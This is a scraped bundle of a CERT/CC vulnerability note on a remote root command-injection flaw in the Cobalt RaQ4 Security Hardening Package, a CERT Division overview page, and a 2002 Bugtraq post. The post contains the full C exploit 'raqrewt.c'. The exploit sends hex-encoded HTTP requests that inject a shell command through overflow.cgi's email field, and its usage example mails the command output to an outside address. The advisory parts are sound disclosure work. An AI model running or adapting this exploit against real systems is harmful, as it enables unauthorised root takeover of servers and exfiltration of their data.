=== Content from www.kb.cert.org_d2893131_20250125_165011.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#810921

## Cobalt RaQ Server Appliances contains vulnerability allowing remote root compromise

#### Vulnerability Note VU#810921

Original Release Date: 2002-12-11 | Last Revised: 2002-12-16

---

### Overview

A remotely exploitable vulnerability exists in Cobalt RaQ Server Appliances with the Security Hardening Package (SHP) installed.

### Description

| The [Cobalt RaQ](http://www.sun.com/hardware/serverappliances/raq4/) is a Sun Server Appliance. Sun [describes](http://www.sun.com/hardware/serverappliances/pdfs/manuals/manual.raq4.pdf) the Cobalt RaQ as follows:  The Cobalt RaQTM4 is a server appliance that provides a dedicated Web-hosting platform and offers new capabilities for high-traffic, complex Web sites and e-commerce applications.The RaQ 4 server appliance offers a full suite of Internet services with remote administration capabilities, pre-packaged in a single rack-unit (1RU) industry-standard enclosure. The RaQ 4 is pre-configured with Apache Web server, Sendmail, File Transfer Protocol (FTP) server, Domain Name System (DNS), the Linux operating system, FrontPage Server extensions, and support for Active Server Pages (ASP), PHP and common gateway interface (CGI) scripts.Sun provides the SHP for Cobalt RaQs. Although it is not installed by default, many users install the SHP. Quoting from the [SHP RaQ 4 User Guide](http://www.sun.com/hardware/serverappliances/pdfs/support/RaQ_4_SHP_UG.pdf):Security Functions include:• Scan detection, logging, and lockout• Buffer overflow protection• Root privilege controlA remotely exploitable vulnerability in the SHP may allow a remote attacker to execute arbitrary code on a Cobalt RaQ Server Appliance. The vulnerability occurs in a cgi script that does not properly filter input. Specifically, overflow.cgi does not adequately filter input destined for the email variable. Because of this flaw, an attacker can use a POST request to fill the email variable with arbitrary commands. The attacker can then call overflow.cgi, which will allow the command the attacker filled the email variable with to be executed with superuser privileges. |
| --- |

### Impact

| A remote attacker may be able to execute arbitrary code on a Cobalt RaQ Server Appliance with the SHP installed. |
| --- |

### Solution

| Apply a [patch](http://ftp.cobalt.sun.com/pub/packages/raq4/eng/RaQ4-en-Security-2.0.1-SHP_REM.pkg). This patch will remove the SHP from your RaQ. |
| --- |

### Vendor Information

810921
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23810921/) to view vendors.**
### [Sun Microsystems Inc.](#IAFY-5GQJU7) Affected

Updated:  December 11, 2002

### Status

Affected

### Vendor Statement

Sun confirms that a remote root exploit does affect the Sun/Cobalt RaQ4 platform if the SHP (Security Hardening Patch) patch was installed.

| Sun has released a Sun Alert which describes how to remove the SHP patch:    [http://sunsolve.Sun.COM/pub-cgi/retrieve.pl?doc=fsalert/49377](http://sunsolve.sun.com/pub-cgi/retrieve.pl?doc=fsalert/49377)The removal patch is available from: <http://ftp.cobalt.sun.com/pub/packages/raq4/eng/RaQ4-en-Security-2.0.1-SHP_REM.pkg> |
| --- |

### Vendor Information

The vendor has not provided us with any further information regarding this vulnerability.

### Addendum

The CERT/CC has no additional comments at this time.

If you have feedback, comments, or additional information about this vulnerability, please send us email.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base |  |  |
| Temporal |  |  |
| Environmental |  |  |

### References

* <http://ftp.cobalt.sun.com/pub/packages/raq4/eng/RaQ4-en-Security-2.0.1-SHP_REM.pkg>
* <http://www.sun.com/hardware/serverappliances/pdfs/support/RaQ_4_SHP_UG.pdf>
* <http://www.sun.com/hardware/serverappliances/pdfs/manuals/manual.raq4.pdf>
* <http://securityresponse.symantec.com/avcenter/security/Content/6326.html>
* <http://www.der-keiler.de/Mailing-Lists/Securiteam/2002-12/0023.html>
* <http://www.sun.com/hardware/serverappliances/raq4/>
* <http://online.securityfocus.com/archive/1/302259>
* <http://www.securitybugware.org/Linux/5861.html>
* <http://www.i-security.nl/files/raqrewt.c>
### Acknowledgements

This vulnerability was publicly reported by .

This document was written by Ian A Finlay.

### Other Information

| **CVE IDs:** | [CVE-2002-1361](http://web.nvd.nist.gov/vuln/detail/CVE-2002-1361) |
| --- | --- |
| **CERT Advisory:** | [CA-2002-35](http://www.cert.org/advisories/CA-2002-35.html) |
| **Severity Metric:** | 41.63 |
| **Date Public:** | 2002-12-05 |
| **Date First Published:** | 2002-12-11 |
| **Date Last Updated:** | 2002-12-16 15:52 UTC |
| **Document Revision:** | 67 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from www.cert.org_93660705_20250125_165005.html ===


search

icon-carat-right

cmu-wordmark

[Carnegie Mellon University](https://www.cmu.edu)

# [Software Engineering Institute](/)

##

1. [SEI](/)
2. [About](/about/)
3. [Divisions](/about/divisions/)
4. The CERT Division

## The CERT Division

The CERT Division is a leader in cybersecurity. We partner with government, industry, law enforcement, and academia to improve the security and resilience of computer systems and networks. We study problems that have widespread cybersecurity implications and develop advanced methods and tools to counter large-scale, sophisticated cyber threats.

* [Leadership](/about/divisions/cert/index.cfm#leadership)
* [What We Do](/about/divisions/cert/index.cfm#cert-division-what-we-do)
* [Careers in the CERT Division](/about/divisions/cert/index.cfm#careers)
* [Recent Vulnerabilities](/about/divisions/cert/index.cfm#CERTRecentlyPublishedVulnerabilityNotes)
* [Case Studies](/about/divisions/cert/index.cfm#case-studies)
* [History](/about/divisions/cert/index.cfm#history)

## Leadership

[![Gregory J. Touhill](/sei-images/images/Touhill_Greg_393_2023_2622.png)](/about/leadership/display.cfm?customel_datapageid_2623=314857)
#### [Gregory J. Touhill](/about/leadership/display.cfm?customel_datapageid_2623=314857)

Director, CERT Division

[![William Wilson](/sei-images/images/Wilson_William_324_200113_2622.png)](/about/leadership/display.cfm?customel_datapageid_2623=3871)
#### [William Wilson](/about/leadership/display.cfm?customel_datapageid_2623=3871)

Deputy Director, CERT Division

[![Chris Inacio](/sei-images/images/inacio-chris-96_2622.jpg)](/about/leadership/display.cfm?customel_datapageid_2623=494689)
#### [Chris Inacio](/about/leadership/display.cfm?customel_datapageid_2623=494689)

Chief Engineer, CERT Division

## What We Do

CERT experts are a diverse group of researchers, software engineers, security analysts, and digital intelligence specialists working together to research security vulnerabilities in software products, contribute to long-term changes in networked systems, and develop cutting-edge information and training to improve the practice of cybersecurity.

Our connection to the internationally known [Carnegie Mellon University](https://www.cmu.edu/) creates multidisciplinary collaboration opportunities and amplifies our research abilities.

#### Autonomy Security and Resilience

Develop and sustain security, resilience, and assurance best practices for the development, construction, and employment of machine learning systems.

#### [Cybersecurity Center Development](https://www.sei.cmu.edu/our-work/cybersecurity-center-development/index.cfm)

Develop measurable and repeatable practices to prepare CSIRTs and other operational security organizations.

#### [Cybersecurity Engineering](https://www.sei.cmu.edu/our-work/cybersecurity-engineering/index.cfm)

Develop methods for engineering mission-essential capabilities that balance security and resiliency with mission performance.

#### [Cyber Workforce Development](https://www.sei.cmu.edu/our-work/cyber-workforce-development/index.cfm)

Develop and maintain a well-equipped cyber workforce that is immediately able to support the cybersecurity needs of organizations.

#### [Enterprise Risk and Resilience Management](https://www.sei.cmu.edu/our-work/enterprise-risk-resilience-management/index.cfm)

Develop measurable practices and frameworks that enable organizations to measure and mitigate risks.

#### [Insider Threat](https://www.sei.cmu.edu/our-work/insider-threat/index.cfm)

Detect and mitigate the impact of insider threats and reduce their occurrence in organizations.

#### [Reverse Engineering for Malware Analysis](https://www.sei.cmu.edu/our-work/reverse-engineering-for-malware-analysis/index.cfm)

Develop tools and methods to identify and mitigate code that causes unintended effects in software systems.

#### [Situational Awareness](https://www.sei.cmu.edu/our-work/situational-awareness/index.cfm)

Analyze the cyber terrain as it evolves to characterize assets at risk, measure adversary activity, and prioritize responses to threat.

#### [Secure Development](https://www.sei.cmu.edu/our-work/secure-development/index.cfm)

Assess platforms through the analysis of source code to assure they adhere to security best practices.

#### [System and Platform Evaluation](https://www.sei.cmu.edu/our-work/projects/display.cfm?customel_datapageid_4050=21361)

Assess software, devices, systems, and platforms of unknown design or origin to find vulnerabilities and strategies for defending against possible attacks.

#### [Security Vulnerabilities](https://www.sei.cmu.edu/our-work/security-vulnerabilities/index.cfm)

Reduce exposure to known vulnerabilities in systems.

* ## Careers in the CERT Division

#### [Cyber Risk Intern](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Cyber-Risk-Intern_2022294-1)

Pittsburgh, PA

#### [Senior Software Engineer](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Senior-Software-Engineer_2020922-1)

Pittsburgh, PA

#### [Associate Research Scientist - Quantum](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Associate-Research-Scientist---Quantum_2021979)

Pittsburgh, PA

#### [Documentation Specialist and Content Strategist](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Documentation-Specialist-and-Content-Strategist_2022203-1)

Pittsburgh, PA

#### [Senior Communications Engineer](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Senior-Communications-Engineer_2022179-1)

Pittsburgh, PA

#### [Senior AI Security Researcher](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Senior-AI-Security-Researcher_2021569-1)

Pittsburgh, PA

#### [Technical Manager - Cybersecurity Assurance Team](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Technical-Manager---Cybersecurity-Assurance-Team_2022101-1)

2 Locations

#### [Software Engineer](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/System-Designer_2017276)

Pittsburgh, PA

#### [AI Security Researcher](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/AI-Security-Researcher_2020107)

Pittsburgh, PA

#### [Vulnerability Researcher](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Vulnerability-Researcher_2019726-1)

Pittsburgh, PA

#### [Senior Vulnerability Researcher](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Senior-Vulnerability-Researcher_2020002-1)

Pittsburgh, PA

#### [Assistant Communications Engineer](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Assistant-Communications-Engineer_2021848-2)

Pittsburgh, PA

#### [Research Scientist - Quantum](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Research-Scientist---Quantum_2021633-1)

Pittsburgh, PA

#### [Senior Research Scientist - Quantum](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Senior-Research-Scientist---Quantum_2021632)

Pittsburgh, PA

#### [Cybersecurity Engineer](https://cmu.wd5.myworkdayjobs.com/SEI/job/Pittsburgh-PA/Cybersecurity-Engineer_2020646-1)

2 Locations

[SEE ALL SEI JOB OPENINGS](https://cmu.wd5.myworkdayjobs.com/en-US/SEI/)

## Recently Published Vulnerabilities

#### [VU#199397: Insecure Implementation of Tunneling Protocols (GRE/IPIP/4in6/6in4)](https://kb.cert.org/vuls/id/199397)

###### January 17, 2025

#### [VU#952657: Rsync contains six vulnerabilities](https://kb.cert.org/vuls/id/952657)

###### January 14, 2025

#### [VU#529659: Howyar Reloader UEFI bootloader vulnerable to unsigned software execution](https://kb.cert.org/vuls/id/529659)

###### January 14, 2025

[More Vulnerabilities](https://www.kb.cert.org/vuls)
[Report a Vulnerability](https://www.kb.cert.org/vuls/report/)

## Case Studies

[![Cyber Lightning Case Study](/sei-images/images/thumb_mid_thumb_cyber-lightning_380x380_1_4070.jpg)](/research-capabilities/all-work/display.cfm?customel_datapageid_4050=25905)
#### [Cyber Lightning Case Study](/research-capabilities/all-work/display.cfm?customel_datapageid_4050=25905)

The SEI hosted Cyber Lightning, a three-day joint training exercise involving Air National Guard and Air Force Reserve units from western Pennsylvania and eastern Ohio.

[Learn More](/research-capabilities/all-work/display.cfm?customel_datapageid_4050=25905)

[![SEI Hosts Crisis Simulation Exercise for Cyber Intelligence Research Consortium](/sei-images/images/thumb_mid_thumb_crisis-simulation_380x380_4070.jpg)](/research-capabilities/all-work/display.cfm?customel_datapageid_4050=26232)
#### [SEI Hosts Crisis Simulation Exercise for Cyber Intelligence Research Consortium](/research-capabilities/all-work/display.cfm?customel_datapageid_4050=26232)

In SEI crisis simulation exercises, participants use scenarios that present fictitious malicious actors and environmental factors based on real-world events.

[Learn More](/research-capabilities/all-work/display.cfm?customel_datapageid_4050=26232)

[![USPS Case Study](/sei-images/images/thumb_standard_thumb_usps-improves-its-cybersecurity-and-resilience_260x260_4070.jpg)](/research-capabilities/all-work/display.cfm?customel_datapageid_4050=25328)
#### [USPS Case Study](/research-capabilities/all-work/display.cfm?customel_datapageid_4050=25328)

The SEI teamed with the U.S. Postal Service to help it improve its cybersecurity and resilience and collaborated on a program to develop a strong cybersecurity workforce.

[Learn More](/research-capabilities/all-work/display.cfm?customel_datapageid_4050=25328)

## History

The CERT Division is the birthplace of cybersecurity. For nearly 30 years, the CERT Division of the SEI has partnered with government, industry, law enforcement, and academia to advance cybersecurity and improve the security and resilience of computer systems and networks.

Originally focused on incident response, we have expanded into cybersecurity areas such as network situational awareness, malicious code analysis, secure coding, resilience management, insider threats, digital investigations and intelligence, workforce development, DevOps, forensics, software assurance, vulnerability discovery and analysis, and risk management.

     ![The CERT Division - Barbara Fraser and Ed DeHart](/sei-images/images/about-divisions-cert-history-aside-144-2_2134.jpg "The CERT Division - Barbara Fraser and Ed DeHart")   Barbara Fraser and Ed DeHart, part of the SEI’s CERT/CC in the early 1990s

## Former Director Richard Pethia

[Richard Pethia](/about/leadership/display.cfm?customel_datapageid_2623=3545) was founding director of the SEI's CERT Division. Pethia, who served as director of CERT from 1988 to 2016, guided the organization through tremendous growth and change. Under Pethia's leadership, the unit expanded and evolved from the CERT Coordination Center—a small group focused on computer incident response—to a research organization of more than 200 professionals dedicated to solving problems with widespread cybersecurity implications.

[SEE FULL PROFILE](/about/leadership/display.cfm?customel_datapageid_2623=3545)

     ![Former Director Richard Pethia](/sei-images/images/about-divisions-cert-pethia-aside-144-2_2159.jpg "Former Director Richard Pethia")

## Related Links

* [CERT Podcast Series](http://www.cert.org/podcasts/index.cfm)
* [CERT/CC Blog Series](http://insights.sei.cmu.edu/cert)
* [Computer Security Incident Response Teams](/education-outreach/computer-security-incident-response-teams/index.cfm)

* [FloCon](https://resources.sei.cmu.edu/news-events/events/flocon)
* [Insider Threat Blog Series](https://insights.sei.cmu.edu/insider-threat)
* [Insider Threat Symposium](https://www.eventbrite.com/e/2017-cert-insider-threat-symposium-registration-31893497309)

* [NatCSIRT Meeting](https://resources.sei.cmu.edu/news-events/events/natcsirt/index.cfm)
* [Vulnerability Database](https://www.kb.cert.org/vuls)

[Report a Vulnerability to CERT/CC](https://www.kb.cert.org/vuls/report/)
[Subscribe to SEI Bulletin](/subscribe-to-sei-bulletin/)
[Request Permission to Use SEI Materials](/legal/request-permission-to-use-sei-material)

Carnegie Mellon University
 Software Engineering Institute
 4500 Fifth Avenue
 Pittsburgh, PA 15213-2612
 412-268-5800

 [  [Facebook](https://www.facebook.com/SEICMU/)  |  [Twitter](https://twitter.com/SEI_CMU)  |  [LinkedIn](https://www.linkedin.com/company/software-engineering-institute)  |  [YouTube](https://www.youtube.com/user/TheSEICMU)  |  [iTunes](https://itunes.apple.com/us/podcast/software-engineering-institute-sei-podcast-series/id566573552?mt=2)  ]

[Contact Us](/contact-us/)

 [  [Office Locations](/locations/index.cfm)  |  [Additional Sites Directory](/additional-sites-directory/index.cfm)  |  [Legal](/legal/index.cfm)  |  [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm)  |  [CMU Ethics Hotline](https://www.cmu.edu/hr/resources/ethics-hotline.html)  |  [www.sei.cmu.edu](/index.cfm)  ]

©2025 Carnegie Mellon University



=== Content from marc.info_835f7938_20250125_165003.html ===

```
[[prev in list](?l=bugtraq&m=103912866027583&w=2)] [[next in list](?l=bugtraq&m=103912790826531&w=2)] [prev in thread] [next in thread]
List:       [bugtraq](?l=bugtraq&r=1&w=2)
Subject:    Cobalt RaQ4 Remote root exploit
From:       [<grazer () digit-labs ! org>](?a=103299277500001&r=1&w=2)
Date:       [2002-12-05 21:38:42](?l=bugtraq&r=1&w=2&b=200212)
[Download RAW [message](?l=bugtraq&m=103912513522807&q=mbox) or [body](?l=bugtraq&m=103912513522807&q=raw)]

Hello,

I've attached an exploit that will allow an attacker to gain remote
root access on Cobalt RaQ's which have the security hardening package
installed (SHP).

the official patch for this problem can be found here :
<http://ftp.cobalt.sun.com/pub/packages/raq4/eng/RaQ4-en-Security-2.0.1-SHP_REM.pkg>

Wouter ter Maat aka grazer@digit-labs.org
<http://www.i-security.nl>

[["raqrewt.c" (TEXT/x-csrc)]](?l=bugtraq&m=103912513522807&q=p3)

// RaQ 4 and possibly others easy remote root compromise
// due to a flaw in the Security Hardening package HEHE!
// Wouter ter Maat aka grazer - <http://www.i-security.nl>

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <unistd.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORT 81 /* default cobalt admin httpd
                   try 444 if 81 runs with ssl */

// cmpstr
#define found "overflow"
#define done "Starting"
#define exec "mail"

// prototypes
int banner();
int makereq(char *host, char *request, char *cmpstr, int port);

int main(int argc, char *argv[]) {
int retval, port;

char cmd[1024];
char cbuf[1024];
char request2[3096];

// evi1 requests
char request1[] = "\x47\x45\x54\x20\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x2e"
                  "\x63\x6f\x62\x61\x6c\x74\x2f\x6f\x76\x65\x72\x66\x6c\x6f"
                  "\x77\x2f\x6f\x76\x65\x72\x66\x6c\x6f\x77\x2e\x63\x67\x69"
                  "\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\n\x48\x6f\x73"
                  "\x74\x3a\x20\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\n\n\n";

char req_tmp[] = "\x50\x4f\x53\x54\x20\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x2e"
		 "\x63\x6f\x62\x61\x6c\x74\x2f\x6f\x76\x65\x72\x66\x6c\x6f\x77"
		 "\x2f\x6f\x76\x65\x72\x66\x6c\x6f\x77\x2e\x63\x67\x69\x20\x48"
		 "\x54\x54\x50\x2f\x31\x2e\x31\n\x41\x63\x63\x65\x70\x74\x3a\x20"
		 "\x69\x6d\x61\x67\x65\x2f\x67\x69\x66\x2c\x20\x69\x6d\x61\x67"
		 "\x65\x2f\x78\x2d\x78\x62\x69\x74\x6d\x61\x70\x2c\x20\x69\x6d"
		 "\x61\x67\x65\x2f\x6a\x70\x65\x67\x2c\x20\x69\x6d\x61\x67\x65"
		 "\x2f\x70\x6a\x70\x65\x67\x2c\x20\x2a\x2f\x2a\n\x41\x63\x63"
		 "\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x6e\x6c\n"
		 "\x43\x6f\x6e\x74\x65\x6e\x74\x2d\x54\x79\x70\x65\x3a\x20\x61"
		 "\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x2d\x77\x77"
		 "\x77\x2d\x66\x6f\x72\x6d\x2d\x75\x72\x6c\x65\x6e\x63\x6f\x64"
		 "\x65\x64\n\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64"
		 "\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70\x2c\x20\x64\x65\x66\x6c"
		 "\x61\x74\x65\n\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20"
		 "\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x34\x2e\x30\x20\x28\x3b\x29\n"
		 "\x48\x6f\x73\x74\x3a\x20\x31\x32\x37\x2e\x30\x2e\x30\x2e\x31"
		 "\x3a\x38\x31\n";

char request3[] = "\x47\x45\x54\x20\x2f\x63\x67\x69\x2d\x62\x69\x6e\x2f\x2e\x63"
		  "\x6f\x62\x61\x6c\x74\x2f\x6f\x76\x65\x72\x66\x6c\x6f\x77\x2f"
		  "\x6f\x76\x65\x72\x66\x6c\x6f\x77\x54\x65\x73\x74\x45\x6d\x61"
	          "\x69\x6c\x2e\x63\x67\x69\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\n"
	          "\x48\x6f\x73\x74\x3a\x20\x6c\x6f\x63\x61\x6c\x68\x6f\x73\x74\n\n\n";

sprintf(cmd, "%s%s%s", "enabled=1&email=`", argv[[2]](#2), "`&page=overflow\n\n");
sprintf(cbuf, "%s %d %s", "Content-Length:", strlen(cmd)-2, "\n\n");
sprintf(request2, "%s%s%s", req_tmp, cbuf, cmd);

banner();

  while(argc < 3) {
    fprintf(stderr, " %s <host> <command> <port> \n", argv[[0]](#0));
    fprintf(stderr, " example: [www.cobalt.com](http://www.cobalt.com) \"id|mail you@addy\" 444\n");
    fprintf(stderr, " default port is set to 81. \n\n");
    exit(0); }

if(argc==3) {
port = PORT; }
else {
port = atoi(argv[[3]](#3)); }

retval = makereq(argv[[1]](#1), request1, found, port);

if(retval==2) {
  printf(" - name cannot be resolved!\n");
 exit(0); } if(retval==3) {
  printf(" - connect: connection refused! d0h!\n");
 exit(0); }

if(retval==404) {
  printf(" - this machine is not vulnerable, dweep!\n");
 exit(0); }
else {
  printf(" + ow yeah, we've found a victim!\n"); }

printf(" ++ Enabling stackguard and creating evil config file...\n");

retval = makereq(argv[[1]](#1), request2, done, port);

 if(retval==404) {
   printf(" -- attack failed , sorry! \n");
  exit(0);}
 else {
   printf(" +++ config file written succesfully ! \n"); }

 printf(" ++++ Let's get our evil command executed...\n");

retval = makereq(argv[[1]](#1), request3, exec, port);

if(retval==404) {
  printf(" --- attack failed, sorry! \n");
 exit(0);}
else {
printf(" +++++ The command : \"%s\"\n +++++ has been run on the server.\n\n", argv[[2]](#2)); }

}

int banner() {
printf("*************************************************\n");
printf("RaQ 4 remote root exploit - grazer@digit-labs.org\n");
printf("Vulnerable : RaQ4 with Security Hardening Update.\n");
printf("             isn't it ironic? :]                 \n");
printf("*************************************************\n"); }

int makereq(char *host, char *request, char *cmpstr, int port) {

int fd, sock, chk;
char buf[2000];

struct sockaddr_in addr;
struct hostent *lh;

if ((lh=gethostbyname(host)) == NULL){
             return 2; }

bzero(&(addr.sin_zero), 8);
addr.sin_family = AF_INET;
addr.sin_port = htons(port);
addr.sin_addr = *((struct in_addr *) lh-> h_addr);

fd = socket(AF_INET, SOCK_STREAM, 0);

if (connect(fd,(struct sockaddr *) &addr ,sizeof(addr)) != 0){
                return 3;
	}

send(fd, request, strlen(request), 0);
read(fd, buf, 500);
if(strstr(buf, cmpstr)!=0) {
return 200; } else {
return 404; }

close(fd);
return 1;
}

[[prev in list](?l=bugtraq&m=103912866027583&w=2)] [[next in list](?l=bugtraq&m=103912790826531&w=2)] [prev in thread] [next in thread]

```

[Configure](?q=configure) |
[About](?q=about) |
[News](?q=news) |
Add a list |
Sponsored by [KoreLogic](http://www.korelogic.com/)


